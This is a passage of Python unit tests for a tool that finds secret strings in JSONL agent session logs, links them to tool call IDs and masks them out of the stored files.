        self.src.reset()
        texts = list(self.src.secret_texts(s))
        self.assertEqual(len(texts), len(V4) + 1)
        tied = [t for t in texts if t.call is not None]
        self.assertEqual([t.call.tool_call_id for t in tied],
                         ["call_1", "call_2", "call_3", "call_4"])
        self.assertEqual(texts[-1].node, "not json " + SECRET)
        self.assertEqual(texts[1].where, "line 2")

    def test_older_generations_are_searched_but_make_no_calls(self):
        self.write("session.v3.jsonl", body([header(3)] + V4[1:3]))
        self.write("session.v4.jsonl", body(V4))
        found = self.stores()
        old = [s for s in found if s.role == "side"][0]
        self.src.reset()
        self.assertEqual(list(self.src.tool_calls(old)), [])
        self.assertTrue(list(self.src.secret_texts(old)))

    def test_a_plain_store_can_be_masked(self):
        path = self.write("session.v4.jsonl", body(V4))
        s, = self.stores()
        result = self.src.mask(s, [SECRET])
        self.assertEqual((result.changed, result.skipped), (True, None))
        with open(path, encoding="utf-8") as fh:
            text = fh.read()
        self.assertNotIn(SECRET, text)
        self.assertEqual(len(text.splitlines()), len(V4))


if __name__ == "__main__":
    unittest.main()
